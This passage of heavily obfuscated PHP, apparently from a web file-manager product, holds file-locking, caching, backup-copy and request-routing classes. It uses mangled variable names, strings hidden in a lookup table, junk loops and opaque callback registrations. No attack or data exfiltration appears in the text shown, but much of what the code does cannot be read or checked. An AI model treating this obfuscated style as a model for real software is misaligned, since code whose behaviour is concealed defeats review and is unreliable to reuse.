fileUnlock($Øå×¬¥µ) { $†”ğ‰Û =& $_SERVER[Î‹ÃÂŞ„]; $‹Ä¬çˆ· = $GLOBALS[$†”ğ‰Û[907]][$Øå×¬¥µ]; if (!$‹Ä¬çˆ·) { return; } $GLOBALS[$†”ğ‰Û[907]][$Øå×¬¥µ] = !1; flock($‹Ä¬çˆ·, LOCK_UN); fclose($‹Ä¬çˆ·); } public static function fileUnlockAll() { $¢âÜÅ×Ø =& $_SERVER[Î‹ÃÂŞ„]; if (!$GLOBALS[$¢âÜÅ×Ø[907]]) { return; } foreach ($GLOBALS[$¢âÜÅ×Ø[907]] as $Õ˜È³†· => $¶›³¹Ş) { if (!$¶›³¹Ş) { continue; } $GLOBALS[$¢âÜÅ×Ø[907]][$Õ˜È³†·] = !1; flock($¶›³¹Ş, LOCK_UN); fclose($¶›³¹Ş); } $GLOBALS[$¢âÜÅ×Ø[907]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $è‚ÀŒ¶¹ =& $_SERVER[Î‹ÃÂŞ„]; $ éÇ­°‡ = $GLOBALS[$è‚ÀŒ¶¹[6]][$è‚ÀŒ¶¹[395]]; self::$cachePath = $ éÇ­°‡[$è‚ÀŒ¶¹[216]][$è‚ÀŒ¶¹[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($“†ºéÄ•, $îÓÜ´©ó = 0) { $÷ª¡±ª° =& $_SERVER[Î‹ÃÂŞ„]; $ƒ›¢½¨Ó = microtime(!0); $€Ö…„Ó = $ƒ›¢½¨Ó + $îÓÜ´©ó + 0.0001; $âŠ÷Òı¡ = rtrim(self::$cachePath, $÷ª¡±ª°[8]) . $÷ª¡±ª°[911] . md5($“†ºéÄ•) . $÷ª¡±ª°[908]; if (file_exists($âŠ÷Òı¡) && filemtime($âŠ÷Òı¡) && filemtime($âŠ÷Òı¡) < time() - 10) { @unlink($âŠ÷Òı¡); } do { if (file_exists($âŠ÷Òı¡)) { cacheLockWait(); continue; } $­½®äÓ† = fopen($âŠ÷Òı¡, $÷ª¡±ª°[912]); if (!$­½®äÓ†) { return !1; } $æô£ª = flock($­½®äÓ†, LOCK_EX | LOCK_NB); self::$caches[$“†ºéÄ•] = array($÷ª¡±ª°[913] => $­½®äÓ†, $÷ª¡±ª°[216] => $âŠ÷Òı¡); fwrite($­½®äÓ†, $€Ö…„Ó); clearstatcache(); if ($­½®äÓ† && $æô£ª) { return !0; } cacheLockWait(); } while (microtime(!0) < $€Ö…„Ó); $this->unlock($“†ºéÄ•); return !1; } public function lockGet($åŸÎëĞ˜) { $Ï¯˜–©« =& $_SERVER[Î‹ÃÂŞ„]; $ö×ÅÉ• = rtrim(self::$cachePath, $Ï¯˜–©«[8]) . $Ï¯˜–©«[911] . md5($åŸÎëĞ˜) . $Ï¯˜–©«[908]; return file_exists($ö×ÅÉ•); } public function unlock($îÄ´¼…Í) { $ˆí—Õ…Ä =& $_SERVER[Î‹ÃÂŞ„]; $Öá§İù = self::$caches[$îÄ´¼…Í]; if (!$Öá§İù) { return; } @flock($Öá§İù[$ˆí—Õ…Ä[913]], LOCK_UN); @fclose($Öá§İù[$ˆí—Õ…Ä[913]]); @unlink($Öá§İù[$ˆí—Õ…Ä[216]]); unset(self::$caches[$îÄ´¼…Í]); } } goto FÒÂ’¬«†; c‡²Ê¼†Ÿ: class BackupFile { public function __construct() { } public function index() { $âÖöşÚğ = Backup::get(); $™ÁªŸ¿“ = $âÖöşÚğ[$_SERVER[Î‹ÃÂŞ„][339]][$_SERVER[Î‹ÃÂŞ„][216]][$_SERVER[Î‹ÃÂŞ„][511]]; $ğñ¦Î±ì = array($_SERVER[Î‹ÃÂŞ„][512] => array($_SERVER[Î‹ÃÂŞ„][854], $™ÁªŸ¿“), $_SERVER[Î‹ÃÂŞ„][855] => array($_SERVER[Î‹ÃÂŞ„][377], $âÖöşÚğ[$_SERVER[Î‹ÃÂŞ„][798]])); $¼‰ˆ…—ï = (int) Model($_SERVER[Î‹ÃÂŞ„][836])->where($ğñ¦Î±ì)->count($_SERVER[Î‹ÃÂŞ„][511]); $¬°Û¼™â = (int) Model($_SERVER[Î‹ÃÂŞ„][836])->where($ğñ¦Î±ì)->sum($_SERVER[Î‹ÃÂŞ„][78]); $±›¬¸¸Õ = new TaskFileTransfer($_SERVER[Î‹ÃÂŞ„][856], $_SERVER[Î‹ÃÂŞ„][827], $¼‰ˆ…—ï, LNG($_SERVER[Î‹ÃÂŞ„][828]) . $_SERVER[Î‹ÃÂŞ„][829] . LNG($_SERVER[Î‹ÃÂŞ„][857])); $±›¬¸¸Õ->task[$_SERVER[Î‹ÃÂŞ„][810]] = $¬°Û¼™â; $Ğ€£ÕÁÒ = array($_SERVER[Î‹ÃÂŞ„][858] => $¼‰ˆ…—ï, $_SERVER[Î‹ÃÂŞ„][859] => $¬°Û¼™â, $_SERVER[Î‹ÃÂŞ„][860] => time()); Backup::set($Ğ€£ÕÁÒ); $ó®º’ñ = !0; $‚ö‡Óæ = $this->storeIds(); $¡‰¤¨Ğ = 1; $ğú‡é«é = 1000; $ù“±îÌ = $›ã¼ïÀƒ = 0; $îßş…¢Ø = array(); $ÅıòÕöâ = $ë‰û‘Óå = 0; do { $˜„ğ›âÙ = $_SERVER[Î‹ÃÂŞ„][861]; $÷­²úš = Model($_SERVER[Î‹ÃÂŞ„][836])->where($ğñ¦Î±ì)->field($˜„ğ›âÙ)->order($_SERVER[Î‹ÃÂŞ„][862])->selectPage($ğú‡é«é, $¡‰¤¨Ğ); $“ÅÍéãı = !empty($÷­²úš[$_SERVER[Î‹ÃÂŞ„][415]]) ? $÷­²úš[$_SERVER[Î‹ÃÂŞ„][415]] : array(); foreach ($“ÅÍéãı as $†îì“Œ“) { if (!$this->_fileExist($†îì“Œ“, $îßş…¢Ø, $‚ö‡Óæ)) { $¼‰ˆ…—ï -= 1; $¬°Û¼™â -= (int) $†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][78]]; write_log("\x66\151\x6c\145\x20\156\x6f\x74\40\x65\x78\x69\163\164\56\x66\x69\154\x65\111\x44\72{$†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][511]]}\54\x20\160\141\x74\150\x3a{$†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][86]]}", $_SERVER[Î‹ÃÂŞ„][863]); continue; } $¨¯—¥¤‘ = $†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][86]]; $çõÁ¸¿ = "\173\x69\x6f\x3a{$âÖöşÚğ[$_SERVER[Î‹ÃÂŞ„][798]]}\175" . substr($¨¯—¥¤‘, strlen("\x7b\151\x6f\72{$†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][864]]}\x7d")); if (IO::exist($çõÁ¸¿)) { $±›¬¸¸Õ->updateFileEnd($†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][32]], $†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][78]]); } else { $çõÁ¸¿ = get_path_father($çõÁ¸¿); IO::mkdir($çõÁ¸¿); if (!IO::copy($¨¯—¥¤‘, $çõÁ¸¿, $_SERVER[Î‹ÃÂŞ„][865])) { write_log($_SERVER[Î‹ÃÂŞ„][866] . $¨¯—¥¤‘ . $_SERVER[Î‹ÃÂŞ„][850] . $çõÁ¸¿ . $_SERVER[Î‹ÃÂŞ„][167], $_SERVER[Î‹ÃÂŞ„][827]); $ó®º’ñ = !1; break; } } $™ÁªŸ¿“ = $†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][511]]; $›ã¼ïÀƒ += 1; $ù“±îÌ += $†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][78]]; $ë‰û‘Óå += 1; $ÅıòÕöâ += $†îì“Œ“[$_SERVER[Î‹ÃÂŞ„][78]]; if ($ù“±îÌ >= 1024 * 1024 * 100) { $Ğ€£ÕÁÒ = array($_SERVER[Î‹ÃÂŞ„][867] => $™ÁªŸ¿“, $_SERVER[Î‹ÃÂŞ„][868] => $ë‰û‘Óå, $_SERVER[Î‹ÃÂŞ„][869] => $ÅıòÕöâ); Backup::set($Ğ€£ÕÁÒ); $ù“±îÌ = $›ã¼ïÀƒ = 0; } } $õùµüİ = count($“ÅÍéãı); $¡‰¤¨Ğ++; } while ($õùµüİ == $ğú‡é«é); $±›¬¸¸Õ->end(); $Ğ€£ÕÁÒ = array($_SERVER[Î‹ÃÂŞ„][870] => 1, $_SERVER[Î‹ÃÂŞ„][808] => time(), $_SERVER[Î‹ÃÂŞ„][822] => 1, $_SERVER[Î‹ÃÂŞ„][867] => $™ÁªŸ¿“, $_SERVER[Î‹ÃÂŞ„][859] => $¬°Û¼™â, $_SERVER[Î‹ÃÂŞ„][858] => $¼‰ˆ…—ï, $_SERVER[Î‹ÃÂŞ„][871] => time()); if ($›ã¼ïÀƒ) { $Ğ€£ÕÁÒ[$_SERVER[Î‹ÃÂŞ„][868]] = $ë‰û‘Óå; $Ğ€£ÕÁÒ[$_SERVER[Î‹ÃÂŞ„][869]] = $ÅıòÕöâ; } Backup::set($Ğ€£ÕÁÒ); $this->_fileFilter($îßş…¢Ø); return !0; } private function _fileExist($ÊÑ¨È“ñ, &$°¢ïè ˆ, $“¼“Ş¦ñ) { $€ë†úÔè =& $_SERVER[Î‹ÃÂŞ„]; $ Ø°Ë¾Ö = $ÊÑ¨È“ñ[$€ë†úÔè[86]]; if (in_array($ÊÑ¨È“ñ[$€ë†úÔè[511]], $°¢ïè ˆ)) { return !1; } if (!in_array($ÊÑ¨È“ñ[$€ë†úÔè[864]], $“¼“Ş¦ñ)) { return !1; } if (IO::exist($ Ø°Ë¾Ö)) { return !0; } $µÊ÷²Ç­ = get_path_father($ Ø°Ë¾Ö); if (IO::exist($µÊ÷²Ç­)) { $°¢ïè ˆ[] = $ÊÑ¨È“ñ[$€ë†úÔè[511]]; return !1; } $±İ¿Æî = array($€ë†úÔè[864] => $ÊÑ¨È“ñ[$€ë†úÔè[864]], $€ë†úÔè[86] => array($€ë†úÔè[429], "{$µÊ÷²Ç­}\x25")); $¬ö±Ô„½ = Model($€ë†úÔè[836])->where($±İ¿Æî)->field($€ë†úÔè[512])->select(); $°¢ïè ˆ = array_merge($°¢ïè ˆ, array_to_keyvalue($¬ö±Ô„½, $€ë†úÔè[12], $€ë†úÔè[511])); return !1; } private function _fileFilter($°Å÷‹’´) { $ñÇ¯†—µ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($°Å÷‹’´)) { return; } $ÒÇ‚Äï = array($ñÇ¯†—µ[511] => array($ñÇ¯†—µ[7], array_unique($°Å÷‹’´))); $ˆÁ–•í§ = Model($ñÇ¯†—µ[872])->where($ÒÇ‚Äï)->field($ñÇ¯†—µ[183])->select(); foreach ($ˆÁ–•í§ as $òÅÁÜ’Ö) { Model($ñÇ¯†—µ[872])->remove($òÅÁÜ’Ö[$ñÇ¯†—µ[183]], !1); } } private function storeIds() { $âÉö‰íñ =& $_SERVER[Î‹ÃÂŞ„]; $ñşâ«± = Model($âÉö‰íñ[814])->listData(); $Óòà¥© = array(); $¢ ‚è©é = $GLOBALS[$âÉö‰íñ[6]][$âÉö‰íñ[91]][$âÉö‰íñ[873]]; foreach ($ñşâ«± as $£Æ™µØ›) { $öäæ¥İ = strtolower($£Æ™µØ›[$âÉö‰íñ[97]]); if (!isset($¢ ‚è©é[$öäæ¥İ])) { continue; } $½şı›š = $âÉö‰íñ[76] . (isset($¢ ‚è©é[$öäæ¥İ]) ? $¢ ‚è©é[$öäæ¥İ] : ucfirst($öäæ¥İ)); if (!class_exists($½şı›š)) { continue; } $Óòà¥©[] = $£Æ™µØ›[$âÉö‰íñ[445]]; } return $Óòà¥©; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÍÜ÷Á¶ˆ =& $_SERVER[Î‹ÃÂŞ„]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Õô“É = $GLOBALS[$ÍÜ÷Á¶ˆ[6]][$ÍÜ÷Á¶ˆ[395]]; $­ïîŞø‘ = $Õô“É[$Õô“É[$ÍÜ÷Á¶ˆ[874]]]; $‡÷Ä¯ì£ = $Õô“É[$ÍÜ÷Á¶ˆ[875]]; switch ($Õô“É[$ÍÜ÷Á¶ˆ[874]]) { case $ÍÜ÷Á¶ˆ[21]: self::$handle = Model($ÍÜ÷Á¶ˆ[876]); break; case $ÍÜ÷Á¶ˆ[877]: self::$handle = new CacheRedis($­ïîŞø‘, $‡÷Ä¯ì£); break; case $ÍÜ÷Á¶ˆ[878]: self::$handle = new CacheMemcached($­ïîŞø‘, $‡÷Ä¯ì£); break; case $ÍÜ÷Á¶ˆ[216]: self::$handle = new CacheFile($­ïîŞø‘, $‡÷Ä¯ì£); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($†şÛÃÅú) { if (is_array($†şÛÃÅú) || is_object($†şÛÃÅú)) { $†şÛÃÅú = json_encode($†şÛÃÅú); } $†şÛÃÅú = rawurlencode($†şÛÃÅú); return md5(KOD_SITE_ID . $_SERVER[Î‹ÃÂŞ„][11] . $†şÛÃÅú); } public static function get($ù…ÏºäÜ, $ŠØÈ¥ü† = false) { $µÍóäëä = self::key($ù…ÏºäÜ); $³Ãñ°À­ = self::init(); if ($ŠØÈ¥ü†) { return unserialize($³Ãñ°À­->get($µÍóäëä)); } if (!isset(self::$memoryCache[$µÍóäëä])) { $¥›³Àêü = $³Ãñ°À­->get($µÍóäëä); self::$memoryCache[$µÍóäëä] = unserialize($¥›³Àêü); } return self::$memoryCache[$µÍóäëä]; } public static function set($„–ùÎÕ‰, $ÕúÕø”, $î•ÃìÌ† = false) { $¶¨™Î¯ä =& $_SERVER[Î‹ÃÂŞ„]; $ã”ÖÕÀ = self::key($„–ùÎÕ‰); if (isset(self::$memoryCache[$ã”ÖÕÀ]) && self::$memoryCache[$ã”ÖÕÀ] === $ÕúÕø”) { return !0; } if ($î•ÃìÌ† === 0) { self::$memoryCache[$ã”ÖÕÀ] = $ÕúÕø”; return !0; } $ÛñÜÑ†› = self::init(); $ÜşÒï¹ = serialize($ÕúÕø”); CacheLock::lock($„–ùÎÕ‰ . $¶¨™Î¯ä[879]); $ÚŠ›ñûã = $ÛñÜÑ†›->set($ã”ÖÕÀ, $ÜşÒï¹, $î•ÃìÌ†); self::$memoryCache[$ã”ÖÕÀ] = $ÕúÕø”; CacheLock::unlock($„–ùÎÕ‰ . $¶¨™Î¯ä[879]); return $ÚŠ›ñûã; } public static function getCall($”‚ÇûÈ÷, $ø®ùŠ, $Å¥ÜÔÆÁ, $é¯§¢œš = array()) { $›í“ã¹Ù =& $_SERVER[Î‹ÃÂŞ„]; $ßëß•ç˜ = self::get($”‚ÇûÈ÷); if ($ßëß•ç˜ || $ßëß•ç˜ === $›í“ã¹Ù[12]) { return $ßëß•ç˜; } $ßëß•ç˜ = call_user_func_array($Å¥ÜÔÆÁ, $é¯§¢œš); $ßëß•ç˜ = $ßëß•ç˜ ? $ßëß•ç˜ : $›í“ã¹Ù[12]; self::set($”‚ÇûÈ÷, $ßëß•ç˜, $ø®ùŠ); return $ßëß•ç˜; } public static function remove($Ù¬İ‡ ê) { $ê¡ğ­ı = self::key($Ù¬İ‡ ê); unset(self::$memoryCache[$ê¡ğ­ı]); self::clearTimeout(); CacheLock::lock($Ù¬İ‡ ê); $å ¶•¹ = self::init()->remove($ê¡ğ­ı); CacheLock::unlock($Ù¬İ‡ ê); return $å ¶•¹; } public static function removeMemory($¹ŠÒ¤ˆ§) { $­Õñ²ëî = self::key($¹ŠÒ¤ˆ§); unset(self::$memoryCache[$­Õñ²ëî]); } public static function clearMemory($³ä’“Ëñ = false) { if ($³ä’“Ëñ) { $³ä’“Ëñ = self::key($³ä’“Ëñ); unset(self::$memoryCache[$³ä’“Ëñ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Î‹ÃÂŞ„][880])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Î‹ÃÂŞ„][881])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ïÔŠ‘¦, $ü¹Í½ş) { $Î”Ãüº¢ =& $_SERVER[Î‹ÃÂŞ„]; $this->cachePath = $ïÔŠ‘¦[$Î”Ãüº¢[86]]; $this->prefix = $Î”Ãüº¢[882]; $this->cacheTime = $ü¹Í½ş; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¿Ö×í³) { $Ø¹ˆÆç =& $_SERVER[Î‹ÃÂŞ„]; $¿Ö×í³ = str_replace(array($Ø¹ˆÆç[883], $Ø¹ˆÆç[99], $Ø¹ˆÆç[75]), $Ø¹ˆÆç[884], $¿Ö×í³); return $this->cachePath . $Ø¹ˆÆç[885] . $¿Ö×í³ . $Ø¹ˆÆç[886]; } public function set($ôœ½¼¥, $Äñ‰»ÆÏ, $£ö¤§Ó³ = false) { $£ö¤§Ó³ = $£ö¤§Ó³ ? $£ö¤§Ó³ : $this->cacheTime; $°îÂÊ³ = $this->getFile($ôœ½¼¥); if (file_put_contents($°îÂÊ³, $this->prefix . $Äñ‰»ÆÏ, LOCK_EX)) { @touch($°îÂÊ³, intval(time() + $£ö¤§Ó³)); clearstatcache(); return !0; } @unlink($°îÂÊ³); return !1; } public function get($×òå‰¾Ö) { $” šÄÁ† = $this->getFile($×òå‰¾Ö); if (file_exists($” šÄÁ†) && filemtime($” šÄÁ†) < time()) { @unlink($” šÄÁ†); return !1; } $èĞß±„Ï = @file_get_contents($” šÄÁ†); return substr($èĞß±„Ï, strlen($this->prefix)); } public function remove($†Â–¹úè) { $ëŒ€½”“ = $this->getFile($†Â–¹úè); return @unlink($ëŒ€½”“); } public function deleteAll() { $ªÒòÂ± =& $_SERVER[Î‹ÃÂŞ„]; $‡¾ü²Á¥ = scandir($this->cachePath); foreach ($‡¾ü²Á¥ as $°ò½Ã¼—) { $óÖéäõ = $this->cachePath . $°ò½Ã¼—; if (strpos($óÖéäõ, $ªÒòÂ±[886]) && strpos($óÖéäõ, $ªÒòÂ±[887])) { @unlink($óÖéäõ); } } } public function clearTimeout() { $ôİîÖş† =& $_SERVER[Î‹ÃÂŞ„]; $ğ·‚Äì¹ = scandir($this->cachePath); foreach ($ğ·‚Äì¹ as $‰ôÂîêö) { $ÓÌ’ÔÏŞ = $this->cachePath . $‰ôÂîêö; if (strpos($ÓÌ’ÔÏŞ, $ôİîÖş†[886]) && strpos($ÓÌ’ÔÏŞ, $ôİîÖş†[887]) && filemtime($ÓÌ’ÔÏŞ) < time()) { @unlink($ÓÌ’ÔÏŞ); } } } } goto a„æœ·ê„ß; f‡Ò¬»ÁÏ×: $zyftxakhcn = $_SERVER[Î‹ÃÂŞ„][653]; if (!$zyftxakhcn) { return; } class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($‰ÓğĞ“Á) { $ÕÍ‰‘ÚÃ =& $_SERVER[Î‹ÃÂŞ„]; $æ³†ÒÈØ =& $_SERVER[ÓØ—üº]; $‡¡†ƒ‡² = explode($æ³†ÒÈØ[0], trim($‰ÓğĞ“Á, $æ³†ÒÈØ[0])); $®ò·’å¤ = $ÕÍ‰‘ÚÃ[654]; $this->defaultModule = $‡¡†ƒ‡²[0] ? $‡¡†ƒ‡²[0] : $this->defaultModule; $this->defaultController = $‡¡†ƒ‡²[1] ? $‡¡†ƒ‡²[1] : $this->defaultController; $‡ªñ“î = $ÕÍ‰‘ÚÃ[655]; $this->defaultAction = $‡¡†ƒ‡²[2] ? $‡¡†ƒ‡²[2] : $this->defaultAction; $Ûõô§ = $ÕÍ‰‘ÚÃ[656]; if (strlen($Ûõô§) < $ÕÍ‰‘ÚÃ[657]) { return; } $this->scex60b26995($æ³†ÒÈØ[1], array($this, $æ³†ÒÈØ[2])); $Ô®òíè = $ÕÍ‰‘ÚÃ[658]; } public function appRun($–Êù³”í) { $ïæŒ¨–Æ =& $_SERVER[Î‹ÃÂŞ„]; $å˜í©ŞÊ =& $_SERVER[ÓØ—üº]; $Šç¦™Ğï = explode($å˜í©ŞÊ[0], $–Êù³”í); $àÉíäÙ = $ïæŒ¨–Æ[659]; if (!$àÉíäÙ) { die; } $Ãáş‹©Ï = strtolower($Šç¦™Ğï[0]); $í¿¼½Ó³ = $å˜í©ŞÊ[3]; if ($Ãáş‹©Ï == $å˜í©ŞÊ[4]) { $í¿¼½Ó³ = $å˜í©ŞÊ[5]; $Šç¦™Ğï[0] = $å˜í©ŞÊ[6]; $Šç¦™Ğï[1] = $Šç¦™Ğï[1] . $å˜í©ŞÊ[7]; $–Êù³”í = join($å˜í©ŞÊ[0], $Šç¦™Ğï); $–Êù³”í = trim($–Êù³”í, $å˜í©ŞÊ[0]); } call_user_func(array($å˜í©ŞÊ[8], $å˜í©ŞÊ[9]), $í¿¼½Ó³ . $å˜í©ŞÊ[10], $–Êù³”í); ActionCall($–Êù³”í); $À»¦‹à’ = $ïæŒ¨–Æ[660]; while (strlen($À»¦‹à’) < $ïæŒ¨–Æ[661]) { if (!$À»¦‹à’) { break; } $À»¦‹à’++; } call_user_func(array($å˜í©ŞÊ[8], $å˜í©ŞÊ[9]), $í¿¼½Ó³ . $å˜í©ŞÊ[11], $–Êù³”í); $ˆÎÂá¸Ş = $ïæŒ¨–Æ[662]; if (!$ˆÎÂá¸Ş) { die; } } private function autorun() { $İ†èª‹™ =& $_SERVER[Î‹ÃÂŞ„]; $•­°Òå =& $_SERVER[ÓØ—üº]; global $config; $–Ìó‡´ = $İ†èª‹™[663]; if (strlen($–Ìó‡´) < $İ†èª‹™[664]) { die; } if (count($config[$•­°Òå[12]]) == 0) { return; } foreach ($config[$•­°Òå[12]] as $Ò¦ƒÆ²» => $‡³×Ö½°) { $this->appRun($‡³×Ö½°); $êßæËãö = $İ†èª‹™[665]; while ($êßæËãö < $İ†èª‹™[657]) { if ($êßæËãö >= 0) { break; } $êßæËãö++; } } } private function ynbe34bbd9ed() { $³ŠŸ«Íú =& $_SERVER[Î‹ÃÂŞ„]; $°ø˜¿†­ =& $_SERVER[ÓØ—üº]; $µé¬ıÅ÷ = $°ø˜¿†­[4]; $„ƒİƒ‹ = $GLOBALS[$°ø˜¿†­[13]][$°ø˜¿†­[14]][0]; if (!$„ƒİƒ‹ || strlen($„ƒİƒ‹) <= strlen($µé¬ıÅ÷)) { return; } if (strtolower(substr($„ƒİƒ‹, -strlen($µé¬ıÅ÷))) != $µé¬ıÅ÷) { return; } $ş¸ğ¬ÅÔ = substr($„ƒİƒ‹, 0, -strlen($µé¬ıÅ÷)); $˜Ğ¹±± = $³ŠŸ«Íú[666]; while (strlen($˜Ğ¹±±) < $³ŠŸ«Íú[667]) { if (!$˜Ğ¹±±) { break; } $˜Ğ¹±±++; } $¸Üˆ•ˆé = array($°ø˜¿†­[4], $ş¸ğ¬ÅÔ); $‚‘£÷ = $³ŠŸ«Íú[668]; while ($‚‘£÷ < $³ŠŸ«Íú[661]) { if ($‚‘£÷ >= 0) { break; } $‚‘£÷++; } $Í¸—‘  = array_slice($GLOBALS[$°ø˜¿†­[13]][$°ø˜¿†­[14]], 1); $GLOBALS[$°ø˜¿†­[13]][$°ø˜¿†­[14]] = array_merge($¸Üˆ•ˆé, $Í¸—‘ ); $Âã’ÅŠ = $³ŠŸ«Íú[669]; if (strlen($Âã’ÅŠ) < $³ŠŸ«Íú[664]) { return; } $GLOBALS[$°ø˜¿†­[13]][$°ø˜¿†­[15]] = implode($°ø˜¿†­[0], $GLOBALS[$°ø˜¿†­[13]][$°ø˜¿†­[14]]); $¸æ»§ã = $³ŠŸ«Íú[670]; while (strlen($¸æ»§ã) < $³ŠŸ«Íú[664]) { if (!$¸æ»§ã) { break; } $¸æ»§ã++; } } private function igcrfdf8fd17() { $»€ÎÜ­ =& $_SERVER[Î‹ÃÂŞ„]; $– ùæùƒ =& $_SERVER[ÓØ—üº]; if ($GLOBALS[$– ùæùƒ[13]][$– ùæùƒ[15]] != $– ùæùƒ[6]) { return; } $¿÷ı¨ãƒ = $_SERVER[$– ùæùƒ[16]]; $¦öşŸË = $– ùæùƒ[17]; if (!strstr($¿÷ı¨ãƒ, $¦öşŸË)) { return; } $ÁÈÊ ‘Ÿ = strrpos($¿÷ı¨ãƒ, $¦öşŸË); $¨ÀªÖ¾Ë = substr($¿÷ı¨ãƒ, $ÁÈÊ ‘Ÿ + strlen($¦öşŸË)); $Í÷°‘û = $»€ÎÜ­[671]; if (strlen($Í÷°‘û) < $»€ÎÜ­[664]) { return; } preg_match_all($– ùæùƒ[18], $¨ÀªÖ¾Ë, $¸‘ˆÚßÌ); $¨ÀªÖ¾Ë = trim($¸‘ˆÚßÌ[0][0], $– ùæùƒ[19]); $GLOBALS[$– ùæùƒ[13]][$– ùæùƒ[14]] = explode($– ùæùƒ[19], $¨ÀªÖ¾Ë); $GLOBALS[$– ùæùƒ[13]][$– ùæùƒ[15]] = implode($– ùæùƒ[0], $GLOBALS[$– ùæùƒ[13]][$– ùæùƒ[14]]); } public function run() { $º¥»­ú· =& $_SERVER[Î‹ÃÂŞ„]; $ŒàÖŞÊ· =& $_SERVER[ÓØ—üº]; $this->igcrfdf8fd17(); $â¥Ôö« = $º¥»­ú·[672]; $this->ynbe34bbd9ed(); $ù£ªÌëƒ = $GLOBALS[$ŒàÖŞÊ·[13]][$ŒàÖŞÊ·[14]]; $Ú¦á ½« = $º¥»­ú·[673]; if (!$Ú¦á ½«) { return; } $ÊŞ”‰¶‘ = $GLOBALS[$ŒàÖŞÊ·[13]][$ŒàÖŞÊ·[15]]; $‰é„ÊÇ = $º¥»­ú·[674]; if (strlen($‰é„ÊÇ) < $º¥»­ú·[667]) { die; } define($ŒàÖŞÊ·[20], isset($ù£ªÌëƒ[0]) && $ù£ªÌëƒ[0] ? $ù£ªÌëƒ[0] : $this->defaultModule); define($ŒàÖŞÊ·[21], isset($ù£ªÌëƒ[1]) && $ù£ªÌëƒ[0] ? $ù£ªÌëƒ[1] : $this->defaultController); define($ŒàÖŞÊ·[22], isset($ù£ªÌëƒ[2]) && $ù£ªÌëƒ[0] ? $ù£ªÌëƒ[2] : $this->defaultAction); define($ŒàÖŞÊ·[23], MOD . $ŒàÖŞÊ·[0] . ST . $ŒàÖŞÊ·[0] . ACT); $¡ªîó‹ = $º¥»­ú·[675]; if (strlen($¡ªîó‹) < $º¥»­ú·[664]) { return; } $_SERVER[$ŒàÖŞÊ·[24]] = strtolower(ACTION); $¤™åÒ¿á = $º¥»­ú·[676]; if (strlen($¤™åÒ¿á) < $º¥»­ú·[667]) { return; } $this->autorun(); if (count($ù£ªÌëƒ) >= 3) { $this->appRun($ÊŞ”‰¶‘); } else { $this->appRun(ACTION); } } private $qucr0c21cbf3 = array(); private $tukmc2fa9103 = ''; public function ctvy5a733ced() { $éÈşÈÌ“ =& $_SERVER[Î‹ÃÂŞ„]; $šà€Û±¥ =& $_SERVER[ÓØ—üº]; $this->isxh2622c67e(); $×–¯¥æû = $éÈşÈÌ“[677]; if (strlen($×–¯¥æû) < $éÈşÈÌ“[667]) { die; } $this->cxos63cdebd4(); $ó»âŒİé = $éÈşÈÌ“[678]; $this->laoz52fe3d4b(); $this->pyuced3760fd(); $ºàõğõ = $éÈşÈÌ“[679]; if (!$ºàõğõ) { return; } $this->yfpabf1e86d1(); $Û–ë‘ å = $éÈşÈÌ“[680]; $this->uohw49556f22(); $˜œ®Ó£ç = $éÈşÈÌ“[681]; if (!$˜œ®Ó£ç) { die; } $this->bcsde55f8435(); $¢ï­±Øø = $éÈşÈÌ“[682]; while ($¢ï­±Øø < $éÈşÈÌ“[664]) { if ($¢ï­±Øø >= 0) { break; } $¢ï­±Øø++; } $this->scex60b26995($šà€Û±¥[25], array($this, $šà€Û±¥[26])); $this->scex60b26995($šà€Û±¥[27], array($this, $šà€Û±¥[28])); $©¿¥™‚º = $éÈşÈÌ“[683]; if (strlen($©¿¥™‚º) < $éÈşÈÌ“[664]) { return; } $this->scex60b26995($šà€Û±¥[29], array($this, $šà€Û±¥[30])); $ÕñãÜÎ• = $éÈşÈÌ“[684]; $this->scex60b26995($šà€Û±¥[31], array($this, $šà€Û±¥[32])); $“êúãçÓ = $éÈşÈÌ“[685]; if (strlen($“êúãçÓ) < $éÈşÈÌ“[664]) { return; } } public function defc16b08baa($ÏİœŒ”†) { $İæ±üíÃ =& $_SERVER[Î‹ÃÂŞ„]; $ç—ÊĞ°² =& $_SERVER[ÓØ—üº]; $øËáÎ¬â = Model($ç—ÊĞ°²[33])->get(); $ÓÏÅ¥ëÔ = array($ç—ÊĞ°²[34], $ç—ÊĞ°²[35], $ç—ÊĞ°²[36], $ç—ÊĞ°²[37], $ç—ÊĞ°²[38], $ç—ÊĞ°²[39], $ç—ÊĞ°²[40], $ç—ÊĞ°²[41], $ç—ÊĞ°²[42], $ç—ÊĞ°²[43], $ç—ÊĞ°²[44], $ç—ÊĞ°²[45], $ç—ÊĞ°²[46], $ç—ÊĞ°²[47], $ç—ÊĞ°²[48], $ç—ÊĞ°²[49], $ç—ÊĞ°²[50], $ç—ÊĞ°²[51], $ç—ÊĞ°²[52], $ç—ÊĞ°²[53], $ç—ÊĞ°²[54], $ç—ÊĞ°²[55], $ç—ÊĞ°²[56], $ç—ÊĞ°²[57], $ç—ÊĞ°²[58], $ç—ÊĞ°²[59], $ç—ÊĞ°²[60], $ç—ÊĞ°²[61], $ç—ÊĞ°²[62], 